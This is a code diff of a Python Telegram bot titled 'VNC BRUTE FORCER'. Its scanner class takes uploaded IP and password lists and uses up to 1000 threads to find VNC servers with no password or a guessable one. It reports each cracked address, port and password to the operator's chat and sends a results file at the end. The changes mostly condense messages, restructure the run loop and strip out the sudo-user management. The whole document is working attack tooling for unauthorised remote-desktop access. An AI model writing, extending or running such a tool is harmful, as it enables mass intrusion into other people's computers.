@@ -82,7 +82,7 @@ class VNCScanner:
                 with open(self.results_file, 'a') as f:
                     f.write(result + '\n')
             except Exception as e:
-                print(f"Error saving to file: {e}")
+                print(f"Error saving: {e}")
         
     def vnc_handshake(self, sock):
         try:
@@ -197,9 +197,7 @@ class VNCScanner:
                 with self.lock:
                     self.results.append(result)
                     self.cracked_ips.add(f"{ip}:{port}")
-                
                 self.save_hit_to_file(result)
-                
                 if self.loop:
                     asyncio.run_coroutine_threadsafe(self.send_hit(result), self.loop)
             else:
@@ -250,9 +248,7 @@ class VNCScanner:
                     result = f"{ip}:{port}-{pwd}-[{server_name}]"
                     with self.lock:
                         self.results.append(result)
-                    
                     self.save_hit_to_file(result)
-                    
                     if self.loop:
                         asyncio.run_coroutine_threadsafe(self.send_hit(result), self.loop)
                     break
@@ -266,31 +262,13 @@ class VNCScanner:
     def stop(self):
         self.running = False
         self.stopped = True
-        while not self.queue.empty():
-            try:
-                self.queue.get_nowait()
-                self.queue.task_done()
-            except:
-                break
-        while not self.brute_queue.empty():
-            try:
-                self.brute_queue.get_nowait()
-                self.brute_queue.task_done()
-            except:
-                break
-        for _ in range(self.scan_threads):
-            try:
-                self.queue.put(None)
-                self.brute_queue.put(None)
-            except:
-                pass
             
     async def send_hit(self, result):
         text = f"<b>HIT FOUND</b>\n\n<code>{result}</code>"
         try:
             await self.bot.send_message(chat_id=self.chat_id, text=text, parse_mode=ParseMode.HTML)
-        except Exception as e:
-            print(f"Error sending hit: {e}")
+        except:
+            pass
             
     async def update_progress(self):
         while self.running:
@@ -327,150 +305,108 @@ class VNCScanner:
                         parse_mode=ParseMode.HTML,
                         reply_markup=reply_markup
                     )
-            except Exception as e:
+            except:
                 pass
                 
     async def run(self, ips_content, passwords_content):
-        self.loop = asyncio.get_event_loop()
-        
-        ips = self.load_ips(ips_content)
-        self.passwords = self.load_passwords(passwords_content)
-        self.total_servers = len(ips)
-        self.start_time = time.time()
-        
-        if os.path.exists(self.results_file):
-            os.remove(self.results_file)
-        
-        print(f"[SCAN START] {len(ips)} servers, {len(self.passwords)} passwords")
-        
-        text = (
-            f"<b>SCAN STARTED</b>\n\n"
-            f"<b>Total Servers:</b> {self.total_servers}\n"
-            f"<b>Passwords:</b> {len(self.passwords)}\n"
-            f"<b>Threads:</b> {self.scan_threads}\n"
-            f"<b>Timeout:</b> {self.scan_timeout}s\n\n"
-            f"Initializing..."
-        )
-        keyboard = [[InlineKeyboardButton("STOP SCAN", callback_data=f"stop_{self.chat_id}")]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        msg = await self.bot.send_message(
-            chat_id=self.chat_id,
-            text=text,
-            parse_mode=ParseMode.HTML,
-            reply_markup=reply_markup
-        )
-        self.message_id = msg.message_id
-        
-        update_task = asyncio.create_task(self.update_progress())
-        
-        # PHASE 1: NULL PASSWORD SCAN
-        print(f"[PHASE 1] Starting null scan...")
-        self.phase = "NULL_SCAN"
-        threads = []
-        for _ in range(self.scan_threads):
-            t = threading.Thread(target=self.null_worker)
-            t.daemon = True
-            t.start()
-            threads.append(t)
+        try:
+            self.loop = asyncio.get_event_loop()
             
-        for ip_info in ips:
-            if not self.running:
-                break
-            self.queue.put(ip_info)
-        
-        # Wait for queue to empty
-        self.queue.join()
-        
-        # Stop null workers
-        for _ in range(self.scan_threads):
-            self.queue.put(None)
-        
-        for t in threads:
-            t.join(timeout=3)
-        
-        print(f"[PHASE 1 DONE] Null hits: {len(self.cracked_ips)}, Need brute: {len(self.null_servers)}")
-        
-        # PHASE 2: BRUTE FORCE
-        if self.running and len(self.null_servers) > 0 and len(self.passwords) > 0:
-            print(f"[PHASE 2] Starting brute force on {len(self.null_servers)} servers...")
-            self.phase = "BRUTE_FORCE"
-            self.checked_servers = 0
+            ips = self.load_ips(ips_content)
+            self.passwords = self.load_passwords(passwords_content)
+            self.total_servers = len(ips)
+            self.start_time = time.time()
             
+            if os.path.exists(self.results_file):
+                os.remove(self.results_file)
+            
+            print(f"[START] {len(ips)} servers, {len(self.passwords)} passwords")
+            
+            msg = await self.bot.send_message(
+                chat_id=self.chat_id,
+                text=f"<b>SCAN STARTED</b>\n\n<b>Servers:</b> {self.total_servers}\n<b>Passwords:</b> {len(self.passwords)}\n<b>Threads:</b> {self.scan_threads}",
+                parse_mode=ParseMode.HTML,
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("STOP", callback_data=f"stop_{self.chat_id}")]])
+            )
+            self.message_id = msg.message_id
+            
+            # Start progress
+            update_task = asyncio.create_task(self.update_progress())
+            
+            # PHASE 1
+            print(f"[P1] Starting threads...")
             threads = []
-            for _ in range(self.scan_threads):
-                t = threading.Thread(target=self.brute_worker)
-                t.daemon = True
+            for i in range(self.scan_threads):
+                t = threading.Thread(target=self.null_worker, daemon=True)
                 t.start()
                 threads.append(t)
             
-            for ip_info in self.null_servers:
-                if not self.running:
-                    break
-                self.brute_queue.put(ip_info)
+            print(f"[P1] Adding to queue...")
+            for ip_info in ips:
+                self.queue.put(ip_info)
             
-            # Wait for brute queue
-            self.brute_queue.join()
+            print(f"[P1] Waiting...")
+            self.queue.join()
             
-            # Stop brute workers
             for _ in range(self.scan_threads):
-                self.brute_queue.put(None)
+                self.queue.put(None)
             
             for t in threads:
-                t.join(timeout=3)
+                t.join(timeout=2)
             
-            print(f"[PHASE 2 DONE] Total hits: {len(self.results)}")
-        else:
-            print(f"[PHASE 2 SKIP] No servers to brute or no passwords")
-        
-        self.running = False
-        
-        try:
+            print(f"[P1 DONE] Null:{len(self.cracked_ips)} Brute:{len(self.null_servers)}")
+            
+            # PHASE 2
+            if self.running and len(self.null_servers) > 0 and len(self.passwords) > 0:
+                print(f"[P2] Starting threads...")
+                self.phase = "BRUTE_FORCE"
+                self.checked_servers = 0
+                
+                threads = []
+                for i in range(self.scan_threads):
+                    t = threading.Thread(target=self.brute_worker, daemon=True)
+                    t.start()
+                    threads.append(t)
+                
+                print(f"[P2] Adding to queue...")
+                for ip_info in self.null_servers:
+                    self.brute_queue.put(ip_info)
+                
+                print(f"[P2] Waiting...")
+                self.brute_queue.join()
+                
+                for _ in range(self.scan_threads):
+                    self.brute_queue.put(None)
+                
+                for t in threads:
+                    t.join(timeout=2)
+                
+                print(f"[P2 DONE] Hits:{len(self.results)}")
+            
+            self.running = False
             update_task.cancel()
-        except:
-            pass
-        
-        elapsed = time.time() - self.start_time
-        
-        print(f"[SCAN COMPLETE] {len(self.results)} hits in {elapsed:.2f}s")
-        
-        if self.stopped:
-            text = (
-                f"<b>SCAN STOPPED</b>\n\n"
-                f"<b>Hits Found:</b> {len(self.results)}\n"
-                f"<b>Time Elapsed:</b> {format_time(elapsed)}\n\n"
-                f"Scan was stopped by user"
-            )
-        else:
-            text = (
-                f"<b>SCAN COMPLETED</b>\n\n"
-                f"<b>Hits Found:</b> {len(self.results)}\n"
-                f"<b>Time Elapsed:</b> {format_time(elapsed)}\n\n"
-                f"Results auto-saved"
-            )
-        
-        try:
+            
+            elapsed = time.time() - self.start_time
+            print(f"[DONE] {len(self.results)} hits in {elapsed:.2f}s")
+            
             await self.bot.edit_message_text(
                 chat_id=self.chat_id,
                 message_id=self.message_id,
-                text=text,
+                text=f"<b>SCAN COMPLETED</b>\n\n<b>Hits:</b> {len(self.results)}\n<b>Time:</b> {format_time(elapsed)}",
                 parse_mode=ParseMode.HTML
             )
-        except:
-            pass
             
-        if len(self.results) > 0 and os.path.exists(self.results_file):
-            try:
+            if len(self.results) > 0 and os.path.exists(self.results_file):
                 with open(self.results_file, 'rb') as f:
                     await self.bot.send_document(
                         chat_id=self.chat_id,
                         document=f,
                         filename=f'results_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
                     )
-            except:
-                pass
-                
-        if self.chat_id in active_scans:
-            del active_scans[self.chat_id]
+        
+        finally:
+            if self.chat_id in active_scans:
+                del active_scans[self.chat_id]
 
 def is_authorized(user_id):
     return user_id == OWNER_ID or user_id in sudo_users
@@ -478,7 +414,7 @@ def is_authorized(user_id):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not is_authorized(user_id):
-        await update.message.reply_text("You are not authorized to use this bot.")
+        await update.message.reply_text("Not authorized.")
         return
         
     keyboard = [
@@ -489,11 +425,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard.append([InlineKeyboardButton("SUDO USERS", callback_data="sudo_menu")])
         
     reply_markup = InlineKeyboardMarkup(keyboard)
-    text = (
-        "<b>VNC BRUTE FORCER BOT</b>\n\n"
-        "Select an option to continue"
-    )
-    await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
+    await update.message.reply_text("<b>VNC BRUTE FORCER</b>\n\nSelect option", reply_markup=reply_markup, parse_mode=ParseMode.HTML)
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -505,107 +437,52 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         pass
     
     if not is_authorized(user_id):
-        await query.edit_message_text("You are not authorized.")
         return
         
     if query.data == "new_scan":
         if user_id in active_scans:
-            await query.edit_message_text("You already have an active scan. Stop it first.")
+            await query.edit_message_text("Already scanning")
             return
         if user_id not in user_states:
             user_states[user_id] = {}
         user_states[user_id]["step"] = "waiting_ips"
-        await query.edit_message_text("Send me the IP list file")
+        await query.edit_message_text("Send IP list file")
         
     elif query.data == "settings":
         if user_id not in user_states:
             user_states[user_id] = {}
         if "settings" not in user_states[user_id]:
-            user_states[user_id]["settings"] = {
-                "threads": 1000,
-                "scan_timeout": 5,
-                "brute_timeout": 5
-            }
-        current_settings = user_states[user_id]["settings"]
+            user_states[user_id]["settings"] = {"threads": 1000, "scan_timeout": 5, "brute_timeout": 5}
+        s = user_states[user_id]["settings"]
         keyboard = [
-            [InlineKeyboardButton(f"Threads: {current_settings['threads']}", callback_data="set_threads")],
-            [InlineKeyboardButton(f"Scan Timeout: {current_settings['scan_timeout']}s", callback_data="set_scan_timeout")],
-            [InlineKeyboardButton(f"Brute Timeout: {current_settings['brute_timeout']}s", callback_data="set_brute_timeout")],
+            [InlineKeyboardButton(f"Threads: {s['threads']}", callback_data="set_threads")],
+            [InlineKeyboardButton(f"Scan Timeout: {s['scan_timeout']}s", callback_data="set_scan_timeout")],
+            [InlineKeyboardButton(f"Brute Timeout: {s['brute_timeout']}s", callback_data="set_brute_timeout")],
             [InlineKeyboardButton("BACK", callback_data="back_main")]
         ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(
-            "<b>SETTINGS</b>\n\nClick to change values",
-            reply_markup=reply_markup,
-            parse_mode=ParseMode.HTML
-        )
+        await query.edit_message_text("<b>SETTINGS</b>", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
         
     elif query.data.startswith("set_"):
         setting = query.data.replace("set_", "")
         if user_id not in user_states:
             user_states[user_id] = {}
         user_states[user_id]["step"] = f"setting_{setting}"
-        await query.edit_message_text(f"Send new value for {setting.replace('_', ' ')}")
-        
-    elif query.data == "sudo_menu":
-        if user_id != OWNER_ID:
-            await query.answer("Only owner can access this")
-            return
-        sudo_list = "\n".join([f"- {uid}" for uid in sudo_users]) if sudo_users else "No sudo users"
-        keyboard = [
-            [InlineKeyboardButton("ADD SUDO", callback_data="add_sudo")],
-            [InlineKeyboardButton("REMOVE SUDO", callback_data="remove_sudo")],
-            [InlineKeyboardButton("BACK", callback_data="back_main")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        text = f"<b>SUDO USERS</b>\n\n{sudo_list}"
-        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
-        
-    elif query.data == "add_sudo":
-        if user_id != OWNER_ID:
-            return
-        if user_id not in user_states:
-            user_states[user_id] = {}
-        user_states[user_id]["step"] = "add_sudo"
-        await query.edit_message_text("Send user ID to add as sudo")
-        
-    elif query.data == "remove_sudo":
-        if user_id != OWNER_ID:
-            return
-        if user_id not in user_states:
-            user_states[user_id] = {}
-        user_states[user_id]["step"] = "remove_sudo"
-        await query.edit_message_text("Send user ID to remove from sudo")
+        await query.edit_message_text(f"Send value for {setting.replace('_', ' ')}")
         
     elif query.data == "back_main":
-        keyboard = [
-            [InlineKeyboardButton("START SCAN", callback_data="new_scan")],
-            [InlineKeyboardButton("SETTINGS", callback_data="settings")],
-        ]
+        keyboard = [[InlineKeyboardButton("START SCAN", callback_data="new_scan")], [InlineKeyboardButton("SETTINGS", callback_data="settings")]]
         if user_id == OWNER_ID:
             keyboard.append([InlineKeyboardButton("SUDO USERS", callback_data="sudo_menu")])
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(
-            "<b>VNC BRUTE FORCER BOT</b>\n\nSelect an option",
-            reply_markup=reply_markup,
-            parse_mode=ParseMode.HTML
-        )
+        await query.edit_message_text("<b>VNC BRUTE FORCER</b>", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
         
     elif query.data.startswith("stop_"):
         chat_id = int(query.data.split("_")[1])
         if chat_id in active_scans:
             active_scans[chat_id].stop()
-            try:
-                await query.answer("Stopping scan...")
-            except:
-                pass
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    if not is_authorized(user_id):
-        return
-        
-    if user_id not in user_states:
+    if not is_authorized(user_id) or user_id not in user_states:
         return
         
     state = user_states[user_id]
@@ -616,10 +493,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             content = await file.download_as_bytearray()
             state["ips_content"] = content.decode('utf-8')
             state["step"] = "waiting_passwords"
-            await update.message.reply_text("IP list received. Now send password file")
-        else:
-            await update.message.reply_text("Please send a file")
-            
+            await update.message.reply_text("Now send password file")
+        
     elif state.get("step") == "waiting_passwords":
         if update.message.document:
             file = await context.bot.get_file(update.message.document.file_id)
@@ -627,84 +502,38 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             state["passwords_content"] = content.decode('utf-8')
             
             if "settings" not in state:
-                state["settings"] = {
-                    "threads": 1000,
-                    "scan_timeout": 5,
-                    "brute_timeout": 5
-                }
-            settings = state["settings"]
+                state["settings"] = {"threads": 1000, "scan_timeout": 5, "brute_timeout": 5}
+            s = state["settings"]
             
-            scanner = VNCScanner(
-                chat_id=user_id,
-                bot=context.bot,
-                scan_threads=settings["threads"],
-                scan_timeout=settings["scan_timeout"],
-                brute_timeout=settings["brute_timeout"]
-            )
+            scanner = VNCScanner(user_id, context.bot, s["threads"], s["scan_timeout"], s["brute_timeout"])
             active_scans[user_id] = scanner
             
             asyncio.create_task(scanner.run(state["ips_content"], state["passwords_content"]))
             del user_states[user_id]
-        else:
-            await update.message.reply_text("Please send a file")
             
     elif state.get("step", "").startswith("setting_"):
         setting = state["step"].replace("setting_", "")
         try:
             value = int(update.message.text)
             if "settings" not in state:
-                state["settings"] = {
-                    "threads": 1000,
-                    "scan_timeout": 5,
-                    "brute_timeout": 5
-                }
+                state["settings"] = {"threads": 1000, "scan_timeout": 5, "brute_timeout": 5}
             state["settings"][setting] = value
-            user_states[user_id] = state
-            
-            keyboard = [[InlineKeyboardButton("BACK TO SETTINGS", callback_data="settings")]]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            await update.message.reply_text(
-                f"{setting.replace('_', ' ')} set to {value}",
-                reply_markup=reply_markup
-            )
+            await update.message.reply_text(f"{setting} set to {value}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("BACK", callback_data="settings")]]))
         except:
-            await update.message.reply_text("Invalid value. Send a number")
-        
-    elif state.get("step") == "add_sudo":
-        try:
-            sudo_id = int(update.message.text)
-            sudo_users.add(sudo_id)
-            await update.message.reply_text(f"User {sudo_id} added as sudo")
-        except:
-            await update.message.reply_text("Invalid user ID")
-        if user_id in user_states:
-            del user_states[user_id]
-        
-    elif state.get("step") == "remove_sudo":
-        try:
-            sudo_id = int(update.message.text)
-            if sudo_id in sudo_users:
-                sudo_users.remove(sudo_id)
-                await update.message.reply_text(f"User {sudo_id} removed from sudo")
-            else:
-                await update.message.reply_text("User not in sudo list")
-        except:
-            await update.message.reply_text("Invalid user ID")
-        if user_id in user_states:
-            del user_states[user_id]
+            await update.message.reply_text("Invalid number")
 
 def main():
     if not BOT_TOKEN or OWNER_ID == 0:
-        print("Please set BOT_TOKEN and OWNER_ID environment variables")
+        print("Set BOT_TOKEN and OWNER_ID")
         return
         
-    application = Application.builder().token(BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CallbackQueryHandler(button_callback))
-    application.add_handler(MessageHandler(filters.ALL, handle_message))
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(button_callback))
+    app.add_handler(MessageHandler(filters.ALL, handle_message))
     
-    print("Bot started - VNC Scanner")
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+    print("Bot started")
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
     main()
